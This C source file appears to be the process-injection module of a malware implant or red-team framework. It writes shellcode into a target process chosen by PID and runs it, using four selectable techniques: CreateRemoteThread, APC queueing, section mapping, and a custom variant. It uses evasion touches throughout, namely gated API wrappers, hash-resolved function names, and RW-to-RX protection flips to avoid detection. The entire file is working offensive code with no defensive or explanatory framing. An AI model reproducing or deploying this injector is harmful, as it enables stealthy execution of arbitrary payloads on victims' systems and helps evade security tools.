#include "evasion/injection.h"
#include "common.h"
#include "config.h"

#if INJECTION_TECHNIQUE == INJECT_CRT

static HANDLE inject_crt(PINSTANCE inst, HANDLE hProcess, BYTE* shellcode, DWORD sc_len, DWORD* step) {
    DBG(inst, "[INJECT] VirtualAllocEx");
    if (step) *step = 21;
    LPVOID remote = gate_VirtualAllocEx(inst, hProcess, NULL, sc_len,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote) { DBG(inst, "[INJECT] VirtualAllocEx FAILED"); return NULL; }

    DBG(inst, "[INJECT] WriteProcessMemory");
    if (step) *step = 22;
    SIZE_T written = 0;
    if (!gate_WriteProcessMemory(inst, hProcess, remote, shellcode, sc_len, &written)) {
        DBG(inst, "[INJECT] WriteProcessMemory FAILED");
    }

    DBG(inst, "[INJECT] VirtualProtectEx");
    if (step) *step = 23;
    DWORD old_protect = 0;
#if defined(INCLUDE_EVASION_SMARTINJECT) && !defined(EVASION_USERWX)
    gate_VirtualProtectEx(inst, hProcess, remote, sc_len, PAGE_EXECUTE_READ, &old_protect);
#else
    gate_VirtualProtectEx(inst, hProcess, remote, sc_len, PAGE_EXECUTE_READWRITE, &old_protect);
#endif

    DBG(inst, "[INJECT] CreateRemoteThread");
    if (step) *step = 24;
    return gate_CreateRemoteThread(inst,
        hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remote, NULL, 0, NULL);
}

#elif INJECTION_TECHNIQUE == INJECT_APC

static HANDLE inject_apc(PINSTANCE inst, HANDLE hProcess, BYTE* shellcode, DWORD sc_len, DWORD* step) {
    if (step) *step = 21;
    LPVOID remote = gate_VirtualAllocEx(inst, hProcess, NULL, sc_len,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote) return NULL;

    if (step) *step = 22;
    SIZE_T written = 0;
    gate_WriteProcessMemory(inst, hProcess, remote, shellcode, sc_len, &written);

    if (step) *step = 23;
    DWORD old_protect = 0;
#if defined(INCLUDE_EVASION_SMARTINJECT) && !defined(EVASION_USERWX)
    gate_VirtualProtectEx(inst, hProcess, remote, sc_len, PAGE_EXECUTE_READ, &old_protect);
#else
    gate_VirtualProtectEx(inst, hProcess, remote, sc_len, PAGE_EXECUTE_READWRITE, &old_protect);
#endif

    if (step) *step = 24;
    HANDLE hThread = gate_CreateRemoteThread(inst,
        hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)resolve_function(inst->Modules.Kernel32,
            hash_string_djb2(XSTR("SleepEx"))),
        (LPVOID)(ULONG_PTR)INFINITE, CREATE_SUSPENDED, NULL);

    if (!hThread) return NULL;

    if (step) *step = 25;
    inst->Win32.QueueUserAPC((PAPCFUNC)remote, hThread, 0);
    gate_ResumeThread(inst, hThread);

    return hThread;
}

#elif INJECTION_TECHNIQUE == INJECT_SECTION

static HANDLE inject_section(PINSTANCE inst, HANDLE hProcess, BYTE* shellcode, DWORD sc_len, DWORD* step) {
    if (!inst->Win32.NtCreateSection || !inst->Win32.NtMapViewOfSection ||
        !inst->Win32.NtUnmapViewOfSection) {
        DBG(inst, "[INJECT] Nt funcs not resolved");
        if (step) *step = 20;
        return NULL;
    }

    LARGE_INTEGER section_size = {};
    section_size.QuadPart = sc_len;

    HANDLE hSection = NULL;
    DBG(inst, "[INJECT] NtCreateSection");
    if (step) *step = 21;
    NTSTATUS status = inst->Win32.NtCreateSection(
        &hSection, SECTION_ALL_ACCESS, NULL, &section_size,
        PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (status != 0 || !hSection) {
        DBG(inst, "[INJECT] NtCreateSection FAILED");
        return NULL;
    }

    PVOID local_view = NULL;
    SIZE_T view_size = 0;
    DBG(inst, "[INJECT] NtMapViewOfSection local");
    if (step) *step = 22;
    status = inst->Win32.NtMapViewOfSection(
        hSection, (HANDLE)(LONG_PTR)-1, &local_view, 0, sc_len, NULL,
        &view_size, 2, 0, PAGE_READWRITE);
    if (status != 0 || !local_view) {
        DBG(inst, "[INJECT] NtMapViewOfSection local FAILED");
        gate_CloseHandle(inst, hSection);
        return NULL;
    }

    es_memcpy(local_view, shellcode, sc_len);

    PVOID remote_view = NULL;
    SIZE_T remote_view_size = 0;
    DBG(inst, "[INJECT] NtMapViewOfSection remote");
    if (step) *step = 23;
    status = inst->Win32.NtMapViewOfSection(
        hSection, hProcess, &remote_view, 0, sc_len, NULL,
        &remote_view_size, 2, 0, PAGE_EXECUTE_READ);

    inst->Win32.NtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, local_view);
    gate_CloseHandle(inst, hSection);

    if (status != 0 || !remote_view) {
        DBG(inst, "[INJECT] NtMapViewOfSection remote FAILED");
        return NULL;
    }

    DBG(inst, "[INJECT] CreateRemoteThread");
    if (step) *step = 24;
    return gate_CreateRemoteThread(inst,
        hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remote_view, NULL, 0, NULL);
}

#elif INJECTION_TECHNIQUE == INJECT_CUSTOM

static HANDLE inject_custom(PINSTANCE inst, HANDLE hProcess, BYTE* shellcode, DWORD sc_len, DWORD* step) {
    if (step) *step = 21;
    LPVOID remote = gate_VirtualAllocEx(inst, hProcess, NULL, sc_len,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote) return NULL;

    if (step) *step = 22;
    SIZE_T written = 0;
    gate_WriteProcessMemory(inst, hProcess, remote, shellcode, sc_len, &written);

    if (step) *step = 23;
    DWORD old_protect = 0;
#if defined(INCLUDE_EVASION_SMARTINJECT) && !defined(EVASION_USERWX)
    gate_VirtualProtectEx(inst, hProcess, remote, sc_len, PAGE_EXECUTE_READ, &old_protect);
#else
    gate_VirtualProtectEx(inst, hProcess, remote, sc_len, PAGE_EXECUTE_READWRITE, &old_protect);
#endif

    if (step) *step = 24;
    return gate_CreateRemoteThread(inst,
        hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remote, NULL, 0, NULL);
}

#endif

HANDLE inject_shellcode_into(PINSTANCE inst, HANDLE hProcess, BYTE* shellcode, DWORD sc_len, DWORD* step) {
#if INJECTION_TECHNIQUE == INJECT_CRT
    return inject_crt(inst, hProcess, shellcode, sc_len, step);
#elif INJECTION_TECHNIQUE == INJECT_APC
    return inject_apc(inst, hProcess, shellcode, sc_len, step);
#elif INJECTION_TECHNIQUE == INJECT_SECTION
    return inject_section(inst, hProcess, shellcode, sc_len, step);
#elif INJECTION_TECHNIQUE == INJECT_CUSTOM
    return inject_custom(inst, hProcess, shellcode, sc_len, step);
#else
    return inject_crt(inst, hProcess, shellcode, sc_len, step);
#endif
}

BOOL inject_shellcode(PINSTANCE inst, DWORD pid, BYTE* shellcode, DWORD sc_len, DWORD* step) {
    if (step) *step = 1;
    HANDLE hProc = gate_OpenProcess(inst, PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) return FALSE;

    if (step) *step = 2;
    HANDLE hThread = inject_shellcode_into(inst, hProc, shellcode, sc_len, step);
    BOOL result = (hThread != NULL);

    if (hThread) gate_CloseHandle(inst, hThread);
    gate_CloseHandle(inst, hProc);
    return result;
}
